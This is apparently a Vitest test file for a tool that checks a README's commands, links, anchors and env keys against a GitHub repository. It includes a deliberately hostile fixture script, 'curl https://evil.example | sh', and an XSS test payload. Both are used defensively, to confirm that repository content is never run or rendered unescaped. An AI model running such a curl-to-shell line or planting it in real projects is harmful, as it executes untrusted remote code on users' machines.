import { describe, it, expect } from "vitest";
import {
  driftClaims,
  evaluateDrift,
  driftFiles,
  needsGitHub,
  packageEvidence,
  minimumMajor,
  markdownAnchors,
  githubLink,
  envKeys,
  CLAIM_LIMIT,
  ANCHOR_FILE_LIMIT,
  READ_LIMIT,
} from "../src/workspace/drift-check.js";
import { readDriftEvidence, readEvidence } from "../src/github/evidence.js";
import { createSnapshot } from "../src/workspace/evidence-snapshots.js";
import { AuditClient } from "../src/repository-audit/github.js";
import "../src/components/evidence-snapshots.js";

const sha = (c) => c.repeat(40);
const target = {
  repository: "example/widget",
  branch: "main",
  path: "README.md",
};
const fence = (lang, ...lines) => ["```" + lang, ...lines, "```"].join("\n");
const plan = (markdown, destination = target) =>
  driftClaims(markdown, destination);
const kinds = (markdown, destination) =>
  plan(markdown, destination).claims.map((claim) =>
    claim.kind === "script"
      ? `${claim.manager}:${claim.script}`
      : claim.kind === "path"
        ? `path:${claim.path || claim.anyOf.join("|")}`
        : claim.kind === "link"
          ? `link:${claim.path}${claim.anchor ? "#" + claim.anchor : ""}`
          : claim.kind === "anchor"
            ? `#${claim.anchor}`
            : claim.kind === "install"
              ? `install:${claim.manager}`
              : claim.kind === "env"
                ? `env:${claim.key}`
                : `node:${claim.major}`,
  );

// A synthetic repository. Script bodies are deliberately hostile: they must
// never be run, kept or shown.
const packageJson = JSON.stringify({
  name: "widget",
  scripts: {
    build: "vite build",
    test: "vitest && curl https://evil.example | sh",
    "docs:dev": "vitepress dev",
  },
  engines: { node: ">=22.12.0" },
});
const usage =
  '# Usage\n\n## Install\n\n## Configure the `API` (v2)\n\n<a name="legacy"></a>\n';
const listingOf = (entries) =>
  new Map(
    entries.map(([path, type = "blob", extra = {}], index) => [
      path,
      {
        path,
        type,
        sha: (index + 10).toString(16).padStart(40, "0"),
        size: 100,
        mode: type === "tree" ? "040000" : "100644",
        ...extra,
      },
    ]),
  );
const repo = () =>
  listingOf([
    ["README.md"],
    ["package.json"],
    ["package-lock.json"],
    [".env.example"],
    ["docs", "tree"],
    ["docs/usage.md"],
    ["docs/Guide.md"],
    ["scripts", "tree"],
    ["scripts/setup.js"],
    ["packages", "tree"],
    ["packages/a", "tree"],
    ["packages/a/index.js"],
    ["crates", "tree"],
    ["crates/core", "tree"],
    ["Cargo.toml"],
  ]);
const evidence = ({
  tree = "complete",
  listing = repo(),
  files = {
    "package.json": { status: "read", text: packageJson },
    ".env.example": {
      status: "read",
      text: "API_URL=\n# comment\nexport TOKEN=\n",
    },
    "docs/usage.md": { status: "read", text: usage },
  },
} = {}) => ({
  head: sha("1"),
  tree,
  listing: tree === "failed" ? new Map() : listing,
  files: new Map(Object.entries(files)),
  notes: [],
});
const check = (markdown, read = evidence(), options) =>
  evaluateDrift(plan(markdown), read, options);
const status = (result, text) =>
  result.results
    .filter((item) => item.text === text)
    .map((item) => item.status);
const one = (result, text) => {
  const items = result.results.filter((item) => item.text === text);
  expect(items, text).toHaveLength(1);
  return items[0];
};

describe("drift claims", () => {
  it("reads commands only from shell fences, skipping output, comments and other languages", () => {
    const markdown = [
      fence(
        "bash",
        "npm run build # trailing comment",
        "# npm run commented",
        "$ npm test",
      ),
      fence(
        "console",
        "$ yarn lint",
        "npm run output-line",
        "> pnpm run serve",
      ),
      fence("js", 'exec("npm run from-js")'),
      fence("", "npm run unlabeled"),
      "    npm run indented",
      "",
      fence("sh", "node scripts/setup.js \\", "  --verbose"),
    ].join("\n\n");
    expect(kinds(markdown)).toEqual([
      "npm:build",
      "npm:test",
      "yarn:lint",
      "pnpm:serve",
      "npm:unlabeled",
      "path:scripts/setup.js",
    ]);
    const continued = plan(markdown).claims.at(-1);
    expect(continued.text).toBe("node scripts/setup.js  --verbose");
  });

  it("ignores placeholders, variables, global installs, npx and package arguments", () => {
    const markdown = fence(
      "bash",
      "npm install -g widget-cli",
      "npm install left-pad",
      "npx create-widget",
      "node $SCRIPT",
      "node path/to/file.js",
      "node <file>",
      "python -m http.server",
      "node ~/bin/tool.js",
      "node /usr/lib/tool.js",
      "yarn add react",
      "pnpm dlx create-thing",
      "npm run",
      "bun test",
    );
    expect(kinds(markdown)).toEqual([]);
  });

  it("marks workspace-scoped commands and follows clone, cd, created files and redirects", () => {
    const claims = plan(
      fence(
        "bash",
        "git clone https://github.com/example/widget.git",
        "cd widget",
        "npm run build -w packages/a",
        "pnpm --filter a run dev",
        "yarn workspace a build",
        "cp .env.example .env && node .env",
        "node gen.js > out.js && node out.js",
        "mkdir -p tmp/cache && node tmp/cache/run.js",
        "cd packages/a",
        "node index.js",
      ),
    ).claims;
    expect(claims.map((c) => c.script || c.path)).toEqual([
      "build",
      "dev",
      ".env.example",
      "gen.js",
      "index.js",
    ]);
    expect(claims[0].scope).toBe("workspace");
    expect(claims[1].scope).toBe("workspace");
    expect(claims.at(-1).cd).toEqual(["widget", "packages/a"]);
    expect(claims.at(-1).clones).toContain("widget");
  });

  it("collects relative, anchor and same-branch GitHub links and counts what it skips", () => {
    const destination = { ...target, path: "docs/README.md" };
    const markdown = [
      "See [usage](usage.md#install), [top](#intro), [self](README.md#intro) and [root](/LICENSE).",
      "[out](../../outside.md) [bad](%E0%A4%A.md) [site](https://example.com) [mail](mailto:a@example.com)",
      "[blob](https://github.com/Example/Widget/blob/main/docs/usage.md#install) [old](https://github.com/example/widget/blob/v1.0/docs/usage.md)",
      "[raw](https://raw.githubusercontent.com/example/widget/refs/heads/main/logo.svg) [other](https://github.com/someone/else/blob/main/x.md)",
      '<img src="img/logo.png" alt="">',
      fence("md", "[fenced](fenced.md)"),
    ].join("\n");
    const result = plan(markdown, destination);
    expect(kinds(markdown, destination)).toEqual([
      "link:docs/usage.md#install",
      "#intro",
      "#intro",
      "link:LICENSE",
      "link:docs/usage.md#install",
      "link:logo.svg",
      "link:docs/img/logo.png",
    ]);
    expect(result.notes.join(" ")).toMatch(/1 relative link\(s\) point above/);
    expect(result.notes.join(" ")).toMatch(
      /1 relative link\(s\) could not be decoded/,
    );
    expect(result.notes.join(" ")).toMatch(/another branch or commit/);
    expect(githubLink("https://github.com/example/widget", target)).toBeNull();
    expect(githubLink("not a url", target)).toBeNull();
  });

  it("reports source line numbers through CRLF, lists and repeated text", () => {
    const markdown = [
      "# Title",
      "",
      "Run `npm run build` first.",
      "",
      "- Step:",
      "",
      "  ```bash",
      "  npm run build",
      "  npm run build",
      "  ```",
      "",
      "[usage](docs/usage.md) and again [usage](docs/usage.md)",
    ].join("\r\n");
    const claims = plan(markdown).claims;
    // A blank first line inside a fence does not shift later lines.
    expect(plan(fence("bash", "", "npm test")).claims[0].line).toBe(3);
    // The same claim twice on one line is checked once.
    expect(claims.map((c) => c.line)).toEqual([3, 8, 9, 12]);
    expect(claims[0].where).toBe("inline");
  });

  it("reads Node version statements from prose and env keys from env fences and exports", () => {
    const markdown = [
      "Requires Node.js 18 or newer. ![node](https://img.shields.io/badge/node-%3E%3D16-green)",
      "",
      "Use node >= 20 for development.",
      "",
      fence(
        "env",
        "API_URL=https://example.com",
        "# comment",
        "export TOKEN=abc",
      ),
      fence("bash", "export PORT=3000"),
      fence("bash", "node --version  # Node 14 or later"),
    ].join("\n");
    expect(kinds(markdown)).toEqual([
      "node:18",
      "node:20",
      "env:API_URL",
      "env:TOKEN",
      "env:PORT",
    ]);
  });

  it("bounds the number of claims and says how many were not checked", () => {
    const lines = Array.from(
      { length: CLAIM_LIMIT + 7 },
      (_, i) => `npm run s${i}`,
    );
    const result = plan(fence("bash", ...lines));
    expect(result.claims).toHaveLength(CLAIM_LIMIT);
    expect(result.notes[0]).toContain("7 more were not");
  });

  it("knows when GitHub is not needed and which files a plan reads", () => {
    expect(needsGitHub(plan("[a](#a)\n\n# A"))).toBe(false);
    expect(needsGitHub(plan(fence("bash", "npm test")))).toBe(true);
    const anchors = Array.from(
      { length: ANCHOR_FILE_LIMIT + 2 },
      (_, i) => `[d${i}](docs/d${i}.md#x)`,
    ).join(" ");
    const listing = listingOf([
      ["package.json"],
      [".env.sample"],
      ...Array.from({ length: ANCHOR_FILE_LIMIT + 2 }, (_, i) => [
        `docs/d${i}.md`,
      ]),
    ]);
    const files = driftFiles(
      plan(`${anchors}\n\n${fence("bash", "npm test", "export KEY=1")}`),
      { listing },
    );
    expect(files.paths.slice(0, 2)).toEqual(["package.json", ".env.sample"]);
    expect(files.paths).toHaveLength(2 + ANCHOR_FILE_LIMIT);
    expect(files.notes[0]).toContain("2 more are unknown");
    // Files absent from the listing, directories and non-Markdown files are never read.
    expect(
      driftFiles(plan("[x](docs#a) [y](a.txt#b) [z](gone.md#c)"), {
        listing: listingOf([["docs", "tree"], ["a.txt"]]),
      }).paths,
    ).toEqual([]);
  });
});

describe("drift evaluation", () => {
  it("separates observed script mismatches from heuristics", () => {
    const result = check(
      [
        fence(
          "bash",
          "npm run build",
          "npm test",
          "npm run lint",
          "npm run-script docs:dev",
          "pnpm run lint",
          "yarn lint",
          "bun run lint",
          "npm start",
          "npm run lint --if-present",
        ),
        "Or run `npm run lint`.",
      ].join("\n\n"),
    );
    expect(status(result, "npm run build")).toEqual(["matches"]);
    expect(status(result, "npm test")).toEqual(["matches"]);
    expect(status(result, "npm run-script docs:dev")).toEqual(["matches"]);
    const lint = result.results.find(
      (item) => item.text === "npm run lint" && item.where === "block",
    );
    expect(lint.status).toBe("mismatch");
    expect(lint.message).toBe(
      'package.json has no "lint" script (scripts: build, test, docs:dev).',
    );
    expect(lint.evidencePath).toBe("package.json");
    expect(status(result, "pnpm run lint")).toEqual(["mismatch"]);
    expect(one(result, "yarn lint").status).toBe("uncertain");
    expect(one(result, "yarn lint").message).toContain("can also run a binary");
    expect(status(result, "bun run lint")).toEqual(["uncertain"]);
    expect(one(result, "npm start").message).toContain("has a default");
    expect(one(result, "npm run lint --if-present").message).toContain(
      "--if-present",
    );
    expect(status(result, "npm run lint --if-present")).toEqual(["uncertain"]);
    const inline = result.results.find((item) => item.where === "inline");
    expect(inline.status).toBe("uncertain");
    expect(inline.message).toContain("mentioned inline");
    // Script bodies are data only; none reaches a result.
    expect(JSON.stringify(result)).not.toContain("evil.example");
    expect(result.counts).toEqual({
      mismatch: 2,
      uncertain: 5,
      unknown: 0,
      matches: 3,
    });
    expect(result.results.map((item) => item.status)).toEqual([
      "mismatch",
      "mismatch",
      ...Array(5).fill("uncertain"),
      ...Array(3).fill("matches"),
    ]);
  });

  it("keeps unreadable, unparseable and unlisted package.json evidence unknown, never drift", () => {
    const markdown = fence("bash", "npm run lint");
    const failed = check(
      markdown,
      evidence({
        files: {
          "package.json": {
            status: "failed",
            note: "GitHub request failed (500).",
          },
        },
      }),
    );
    expect(failed.results[0].status).toBe("unknown");
    expect(failed.results[0].message).toContain("GitHub request failed (500).");
    const broken = check(
      markdown,
      evidence({
        files: { "package.json": { status: "read", text: "{ not json" } },
      }),
    );
    expect(broken.results[0].status).toBe("unknown");
    expect(broken.results[0].message).toContain("could not be parsed");
    for (const tree of ["truncated", "failed"]) {
      const listing = repo();
      listing.delete("package.json");
      const result = check(markdown, evidence({ tree, listing, files: {} }));
      expect(result.results[0].status, tree).toBe("unknown");
    }
    const absent = repo();
    absent.delete("package.json");
    const missing = check(markdown, evidence({ listing: absent, files: {} }));
    expect(missing.results[0].status).toBe("mismatch");
    expect(missing.results[0].message).toContain("No package.json");
    expect(check(markdown, null).results[0].status).toBe("unknown");
  });

  it("does not judge commands that run in workspaces, other folders or an ambiguous directory", () => {
    const result = check(
      [
        fence(
          "bash",
          "npm run lint -w packages/a",
          "cd packages/a",
          "npm run lint",
          "node index.js",
          "node missing.js",
        ),
        fence("bash", "node other.js"),
        fence("bash", "cd somewhere-else", "node anything.js", "npm run lint"),
      ].join("\n\n"),
    );
    expect(status(result, "npm run lint -w packages/a")).toEqual(["unknown"]);
    expect(status(result, "npm run lint")).toEqual(["unknown", "unknown"]);
    expect(status(result, "node index.js")).toEqual(["matches"]);
    // In the folder it changed into, a missing file is still an observed mismatch.
    expect(status(result, "node missing.js")).toEqual(["mismatch"]);
    expect(one(result, "node missing.js").message).toContain(
      "packages/a/missing.js",
    );
    // The next block may continue in packages/a or start at the root.
    expect(status(result, "node other.js")).toEqual(["uncertain"]);
    expect(one(result, "node other.js").message).toContain("another directory");
    expect(status(result, "node anything.js")).toEqual(["unknown"]);
    // A README in a subfolder makes the working directory ambiguous too.
    const nested = evaluateDrift(
      plan(fence("bash", "npm run lint", "node gone.js"), {
        ...target,
        path: "docs/README.md",
      }),
      evidence(),
    );
    expect(nested.results.map((item) => item.status)).toEqual([
      "uncertain",
      "uncertain",
    ]);
  });

  it("reports missing command files, with generated, ignored and case-only cases kept uncertain", () => {
    const result = check(
      fence(
        "bash",
        "node scripts/setup.js",
        "node scripts/seed.js",
        "node Scripts/setup.js",
        "npm run build && node dist/index.js",
        "node .env.local",
        "make build",
        "make -f build.mk",
        "docker compose up",
        "pip install -r requirements.txt",
        "cd crates/core",
        "cargo build",
      ),
    );
    expect(status(result, "node scripts/setup.js")).toEqual(["matches"]);
    expect(one(result, "node scripts/seed.js").status).toBe("mismatch");
    expect(one(result, "node scripts/seed.js").message).toBe(
      `scripts/seed.js: not in the repository at ${sha("1").slice(0, 7)}.`,
    );
    const cased = one(result, "node Scripts/setup.js");
    expect(cased.status).toBe("mismatch");
    expect(cased.message).toContain(
      "scripts/setup.js exists; GitHub paths are case-sensitive.",
    );
    // Results are ordered by status: the generated dist/ file before the
    // matching build script.
    expect(status(result, "npm run build && node dist/index.js")).toEqual([
      "uncertain",
      "matches",
    ]);
    expect(status(result, "node .env.local")).toEqual(["uncertain"]);
    const nested = check(fence("bash", "cd packages/a", "node dist/cli.js"));
    expect(status(nested, "node dist/cli.js")).toEqual(["uncertain"]);
    expect(one(nested, "node dist/cli.js").message).toContain(
      "packages/a/dist/cli.js",
    );
    expect(one(result, "make build").status).toBe("mismatch");
    expect(one(result, "make build").message).toContain(
      "make needs Makefile or makefile or GNUmakefile",
    );
    expect(status(result, "make -f build.mk")).toEqual(["mismatch"]);
    expect(status(result, "docker compose up")).toEqual(["mismatch"]);
    expect(status(result, "pip install -r requirements.txt")).toEqual([
      "mismatch",
    ]);
    // cargo looks upward for Cargo.toml.
    expect(status(result, "cargo build")).toEqual(["matches"]);
    // Inline path mentions are heuristics.
    const inline = check("Edit `src/config/app.js` or `scripts/setup.js`.");
    expect(inline.results.map((item) => item.status)).toEqual([
      "uncertain",
      "matches",
    ]);
  });

  it("checks lockfiles and package managers", () => {
    const listing = repo();
    listing.delete("package-lock.json");
    const noLock = check(
      fence("bash", "npm ci", "npm install"),
      evidence({ listing }),
    );
    expect(status(noLock, "npm ci")).toEqual(["mismatch"]);
    // No lockfile at all says nothing about npm install.
    expect(status(noLock, "npm install")).toEqual([]);
    const result = check(
      fence("bash", "npm ci", "yarn install", "yarn", "pnpm install"),
    );
    expect(status(result, "npm ci")).toEqual(["matches"]);
    expect(status(result, "yarn install")).toEqual(["uncertain"]);
    expect(one(result, "yarn install").message).toContain("package-lock.json");
    expect(status(result, "yarn")).toEqual(["uncertain"]);
    const declared = check(
      fence("bash", "npm install"),
      evidence({
        files: {
          "package.json": {
            status: "read",
            text: JSON.stringify({ packageManager: "pnpm@9.1.0" }),
          },
        },
      }),
    );
    expect(one(declared, "npm install").status).toBe("uncertain");
    expect(one(declared, "npm install").message).toContain(
      "packageManager pnpm",
    );
    const truncated = new Map(repo());
    truncated.delete("package-lock.json");
    expect(
      status(
        check(
          fence("bash", "npm ci"),
          evidence({ tree: "truncated", listing: truncated }),
        ),
        "npm ci",
      ),
    ).toEqual(["unknown"]);
  });

  it("reports missing linked files, broken anchors and unreadable link evidence", () => {
    const result = check(
      [
        "[usage](docs/usage.md#install) [config](docs/usage.md#configure-the-api-v2) [legacy](docs/usage.md#legacy)",
        "[near](docs/usage.md#configure-the-api-v-2) [gone](docs/usage.md#uninstall) [line](scripts/setup.js#L3)",
        "[missing](docs/missing.md) [cased](docs/guide.md) ![logo](img/logo.png) [dir](docs/)",
        "[blob](https://github.com/example/widget/blob/main/docs/removed.md)",
      ].join("\n"),
    );
    const by = (text) => one(result, text);
    expect(by("docs/usage.md#install").status).toBe("matches");
    expect(by("docs/usage.md#configure-the-api-v2").status).toBe("matches");
    expect(by("docs/usage.md#legacy").status).toBe("matches");
    expect(by("docs/usage.md#configure-the-api-v-2").status).toBe("uncertain");
    expect(by("docs/usage.md#configure-the-api-v-2").message).toContain(
      "#configure-the-api-v2 is similar",
    );
    expect(by("docs/usage.md#uninstall").status).toBe("mismatch");
    expect(by("scripts/setup.js#L3").status).toBe("matches");
    expect(by("docs/missing.md").status).toBe("mismatch");
    expect(by("docs/guide.md").message).toContain("docs/Guide.md exists");
    expect(by("img/logo.png").message).toMatch(
      /^Image img\/logo.png is not in the repository/,
    );
    expect(by("docs/").status).toBe("matches");
    expect(
      by("https://github.com/example/widget/blob/main/docs/removed.md").status,
    ).toBe("mismatch");

    const failed = check(
      "[usage](docs/usage.md#install) [new](docs/new.md)",
      evidence({
        tree: "truncated",
        files: {
          "docs/usage.md": {
            status: "failed",
            note: "Larger than the 256 KB read limit.",
          },
        },
      }),
    );
    expect(failed.results.map((item) => [item.text, item.status])).toEqual([
      ["docs/usage.md#install", "unknown"],
      ["docs/new.md", "unknown"],
    ]);
    expect(failed.results[0].message).toContain("256 KB");
    expect(failed.results[1].message).toContain("truncated");
  });

  it("checks anchors within the document offline, allowing GitHub's built-in anchors", () => {
    const markdown = [
      "# Widget",
      "## Getting Started!",
      "## Getting Started!",
      '<h2 id="Custom">Custom</h2>',
      "[a](#getting-started) [b](#getting-started-1) [c](#custom) [d](#getting_started)",
      "[e](#removed-section) [f](#top) [g](#readme) [h](#user-content-widget) [i](#L10)",
    ].join("\n\n");
    expect(markdownAnchors(markdown)).toEqual(
      expect.arrayContaining([
        "widget",
        "getting-started",
        "getting-started-1",
        "custom",
      ]),
    );
    const result = evaluateDrift(plan(markdown), null);
    expect(result.results.map((item) => [item.text, item.status])).toEqual([
      ["#removed-section", "mismatch"],
      ["#getting_started", "uncertain"],
      ["#getting-started", "matches"],
      ["#getting-started-1", "matches"],
      ["#custom", "matches"],
      ["#user-content-widget", "matches"],
    ]);
    expect(result.head).toBe("");
  });

  it("treats Node version prose and env keys as heuristics", () => {
    const result = check(
      [
        "Requires Node.js 18 or newer.",
        "",
        "Node 22+ is supported.",
        "",
        fence("env", "API_URL=x", "SECRET_KEY=y", "TOKEN=z"),
      ].join("\n"),
    );
    expect(status(result, "Node.js 18 or newer")).toEqual(["uncertain"]);
    expect(one(result, "Node.js 18 or newer").message).toContain('">=22.12.0"');
    expect(status(result, "Node 22+")).toEqual(["matches"]);
    expect(status(result, "API_URL=x")).toEqual(["matches"]);
    expect(status(result, "TOKEN=z")).toEqual(["matches"]);
    expect(one(result, "SECRET_KEY=y").status).toBe("uncertain");
    expect(one(result, "SECRET_KEY=y").message).toContain(
      "The code may still read it.",
    );
    expect(result.counts.mismatch).toBe(0);

    const odd = check(
      "Requires Node 18 or later.",
      evidence({
        files: {
          "package.json": {
            status: "read",
            text: '{"engines":{"node":"<20"}}',
          },
        },
      }),
    );
    expect(odd.results[0].status).toBe("unknown");
    const listing = repo();
    listing.delete(".env.example");
    const noExample = check(fence("env", "API_URL=x"), evidence({ listing }));
    expect(noExample.results).toEqual([]);
    expect(noExample.notes.join(" ")).toContain(
      "1 environment variable(s) were not checked",
    );
  });

  it("annotates results with what changed since the Baseline", () => {
    const baseline = createSnapshot({
      documentId: "doc-1",
      target,
      source: "",
      now: Date.UTC(2026, 9, 1),
      evidence: {
        head: sha("9"),
        tree: "complete",
        entries: [
          {
            path: "README.md",
            kind: "readme",
            status: "captured",
            type: "file",
            sha: sha("3"),
          },
          {
            path: "package.json",
            kind: "manifest",
            status: "captured",
            type: "file",
            sha: sha("4"),
          },
          { path: "docs/usage.md", kind: "linked", status: "missing" },
        ],
      },
    });
    const result = check(
      `${fence("bash", "npm run lint")}\n\n[usage](docs/usage.md)`,
      evidence(),
      { baseline },
    );
    expect(one(result, "npm run lint").baseline).toBe("changed");
    expect(one(result, "docs/usage.md").baseline).toBe("added");
  });

  it("parses repository files as data only", () => {
    expect(packageEvidence(packageJson)).toEqual({
      scripts: ["build", "test", "docs:dev"],
      workspaces: false,
      node: ">=22.12.0",
      packageManager: "",
    });
    expect(packageEvidence('{"scripts":["a"]}').scripts).toEqual([]);
    expect(packageEvidence('﻿{"scripts":{"a":"b"}}').scripts).toEqual(["a"]);
    expect(() => packageEvidence("[]")).toThrow();
    expect(envKeys("A=1\n  export B=2\n#C=3\nnot a key\n")).toEqual(["A", "B"]);
    expect(minimumMajor(">=22.12.0")).toBe(22);
    expect(minimumMajor("^20.0.0 || >=22")).toBe(20);
    expect(minimumMajor("18.x")).toBe(18);
    expect(minimumMajor(">18")).toBe(19);
    expect(minimumMajor("*")).toBeNull();
    expect(minimumMajor("<20")).toBeNull();
  });
});

const json = (data, status = 200, headers = {}) =>
  new Response(JSON.stringify(data), { status, headers });
const blob = (text) => {
  const bytes = new TextEncoder().encode(text);
  return {
    encoding: "base64",
    size: bytes.length,
    content: btoa(String.fromCharCode(...bytes)),
  };
};
function github({ tree, blobs = {}, head = sha("1") }) {
  const requests = [];
  const client = new AuditClient({
    fetcher: async (url, init) => {
      requests.push({ url, method: init?.method || "GET" });
      if (url.includes("/commits?"))
        return typeof head === "number"
          ? json({}, head)
          : json([{ sha: head, commit: { tree: { sha: sha("2") } } }]);
      if (url.includes("/git/trees/"))
        return typeof tree === "number" ? json({}, tree) : json(tree);
      const match = url.match(/\/git\/blobs\/([a-f\d]+)$/);
      if (match && match[1] in blobs) {
        const reply = blobs[match[1]];
        return typeof reply === "function" ? reply() : json(reply);
      }
      return json({}, 404);
    },
  });
  return { client, requests };
}
const treeOf = (items, truncated = false) => ({
  sha: sha("2"),
  truncated,
  tree: items.map(([path, type, id, extra = {}]) => ({
    path,
    type,
    sha: sha(id),
    size: 50,
    mode: "100644",
    ...extra,
  })),
});
const markdown = [
  "Requires Node.js 18 or newer.",
  "",
  fence(
    "bash",
    "npm ci",
    "npm run build",
    "npm run lint",
    "node scripts/seed.js",
    "export API_URL=x",
  ),
  "",
  "[usage](docs/usage.md#install) [old](docs/usage.md#removed) [gone](docs/gone.md)",
].join("\n");

describe("reading drift evidence", () => {
  const files = treeOf([
    ["README.md", "blob", "3"],
    ["package.json", "blob", "4"],
    ["package-lock.json", "blob", "5"],
    [".env.example", "blob", "6"],
    ["docs", "tree", "7"],
    ["docs/usage.md", "blob", "8"],
    ["scripts", "tree", "9"],
  ]);
  const blobs = {
    [sha("4")]: blob(packageJson),
    [sha("6")]: blob("API_URL=\n"),
    [sha("8")]: blob(usage),
  };

  it("reads the tree and a bounded set of blobs by revision with GET only, then discards content", async () => {
    const { client, requests } = github({ tree: files, blobs });
    const drift = plan(markdown);
    const read = await readDriftEvidence({ client, target, plan: drift });
    expect(requests.map((r) => r.method)).toEqual(Array(5).fill("GET"));
    expect(
      requests.map((r) =>
        r.url.replace("https://api.github.com/repos/example/widget", ""),
      ),
    ).toEqual([
      "/commits?sha=main&per_page=1",
      `/git/trees/${sha("2")}?recursive=1`,
      `/git/blobs/${sha("4")}`,
      `/git/blobs/${sha("6")}`,
      `/git/blobs/${sha("8")}`,
    ]);
    const result = evaluateDrift(drift, read);
    expect(result.head).toBe(sha("1"));
    expect(
      result.results.map((item) => [item.text.slice(0, 22), item.status]),
    ).toEqual([
      ["npm run lint", "mismatch"],
      ["node scripts/seed.js", "mismatch"],
      ["docs/usage.md#removed", "mismatch"],
      ["docs/gone.md", "mismatch"],
      ["Node.js 18 or newer", "uncertain"],
      ["npm ci", "matches"],
      ["npm run build", "matches"],
      ["export API_URL=x", "matches"],
      ["docs/usage.md#install", "matches"],
    ]);
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain("evil.example");
    expect(serialized).not.toContain("vite build");
    expect(serialized).not.toContain("# Usage");
  });

  it("keeps unreadable files unknown and stops after a rate limit", async () => {
    const tooBig = treeOf([
      ["package.json", "blob", "4", { size: READ_LIMIT + 1 }],
      [".env.example", "blob", "6", { mode: "120000" }],
      ["docs", "tree", "7"],
      ["docs/usage.md", "blob", "8"],
      ["docs/b.md", "blob", "a"],
    ]);
    const { client, requests } = github({
      tree: tooBig,
      blobs: {
        [sha("8")]: () =>
          json({ message: "limit" }, 403, {
            "x-ratelimit-remaining": "0",
            "x-ratelimit-reset": "9999999999",
          }),
        [sha("a")]: blob("# B"),
      },
    });
    const drift = plan(`${markdown}\n[b](docs/b.md#b)`);
    const read = await readDriftEvidence({ client, target, plan: drift });
    expect(read.files.get("package.json").note).toContain("256 KB");
    expect(read.files.get(".env.example").note).toBe("Not a regular file.");
    expect(read.files.get("docs/usage.md").status).toBe("failed");
    expect(read.files.get("docs/b.md").note).toMatch(/^Not read: /);
    // Oversized and symbolic-link files are refused without a request, and
    // nothing is requested after the rate limit.
    expect(requests.filter((r) => r.url.includes("/git/blobs/"))).toHaveLength(
      1,
    );
    const result = evaluateDrift(drift, read);
    for (const text of [
      "npm run build",
      "npm run lint",
      "docs/usage.md#install",
      "docs/b.md#b",
    ])
      expect(status(result, text), text).toEqual(["unknown"]);
    // seed.js, gone.md and npm ci's missing lockfile are confirmed by the tree.
    expect(result.counts.mismatch).toBe(3);
  });

  it("treats non-UTF-8, malformed and failed blobs as unknown", async () => {
    const { client } = github({
      tree: files,
      blobs: {
        [sha("4")]: { encoding: "base64", size: 2, content: btoa("\xff\xfe") },
        [sha("6")]: { encoding: "utf-8", size: 9, content: "API_URL=\n" },
        [sha("8")]: () => json({}, 500),
      },
    });
    const read = await readDriftEvidence({
      client,
      target,
      plan: plan(markdown),
    });
    expect(read.files.get("package.json").note).toBe("Not UTF-8 text.");
    expect(read.files.get(".env.example").note).toContain("unreadable");
    expect(read.files.get("docs/usage.md").note).toContain("500");
  });

  it("reads no content when the tree fails, and fails without saving when the head cannot be read", async () => {
    const failedTree = github({ tree: 500 });
    const read = await readDriftEvidence({
      client: failedTree.client,
      target,
      plan: plan(markdown),
    });
    expect(read.tree).toBe("failed");
    expect(failedTree.requests.some((r) => r.url.includes("/git/blobs/"))).toBe(
      false,
    );
    const result = evaluateDrift(plan(markdown), read);
    expect(result.counts.mismatch).toBe(0);
    expect(result.counts.unknown).toBe(result.results.length);

    await expect(
      readDriftEvidence({
        client: github({ tree: files, head: 404 }).client,
        target,
        plan: plan(markdown),
      }),
    ).rejects.toMatchObject({ kind: "not-found" });
    const offline = new AuditClient({
      fetcher: async () => {
        throw new TypeError("Failed to fetch");
      },
    });
    await expect(
      readDriftEvidence({ client: offline, target, plan: plan(markdown) }),
    ).rejects.toMatchObject({
      kind: "network",
    });
    const controller = new AbortController();
    controller.abort();
    await expect(
      readDriftEvidence({
        client: github({ tree: files, blobs }).client,
        target,
        plan: plan(markdown),
        signal: controller.signal,
      }),
    ).rejects.toThrow();
  });

  it("leaves snapshot capture unchanged by the shared tree reader", async () => {
    const { client } = github({ tree: files, blobs });
    const captured = await readEvidence({
      client,
      target,
      linked: ["docs/usage.md", "docs/gone.md"],
    });
    expect(captured.entries.map((e) => [e.path, e.status])).toEqual([
      ["README.md", "captured"],
      ["package.json", "captured"],
      ["package-lock.json", "captured"],
      ["docs/usage.md", "captured"],
      ["docs/gone.md", "missing"],
    ]);
  });
});

describe("drift check dialog", () => {
  it("groups findings, escapes repository text and shows empty and partial states", () => {
    const el = document.createElement("evidence-snapshots");
    el.configure({
      draft: { id: "doc-1", markdown: "" },
      target,
      snapshots: undefined,
    });
    expect(el.querySelector("[data-drift-run]").textContent).toBe(
      "Run drift check",
    );
    expect(el.querySelector("[data-drift]").hidden).toBe(true);
    const result = check(
      `${fence("bash", 'npm run "<img src=x onerror=alert(1)>"', "npm run build", "yarn lint")}\n\n[gone](#gone)`,
    );
    el.showDrift(result);
    const section = el.querySelector("[data-drift]");
    expect(section.hidden).toBe(false);
    expect(section.querySelector("img")).toBeNull();
    expect(section.querySelector("[data-drift-counts]").textContent).toBe(
      "1 observed mismatch · 1 uncertain · 0 unknown · 1 match",
    );
    expect(
      [...section.querySelectorAll("h3")].map((h) => h.textContent),
    ).toEqual(["Observed mismatches (1)", "Uncertain findings (1)"]);
    expect(
      section.querySelector('[data-drift-group="matches"] summary').textContent,
    ).toBe("Matches (1)");
    expect(section.textContent).toContain("Nothing was run, saved or written");
    expect(section.textContent).toContain("never treated as drift");
    // The unsafe script name is not a valid script name, so it is not a claim.
    expect(section.textContent).not.toContain("onerror");

    el.showDrift(
      evaluateDrift(plan("Plain text."), evidence({ tree: "truncated" })),
    );
    expect(el.querySelector("[data-drift-empty]")).not.toBeNull();
    expect(el.querySelector("[data-drift-partial]").textContent).toContain(
      "truncated",
    );
    const escaped = evaluateDrift(plan("[x](<docs/a&lt;b>.md>)"), evidence());
    el.showDrift(escaped);
    expect(el.querySelector("[data-drift] code").innerHTML).toContain("&lt;");
    el.configure({
      draft: { id: "doc-1", markdown: "" },
      target: null,
      snapshots: undefined,
    });
    expect(el.querySelector("[data-drift-run]")).toBeNull();
  });
});
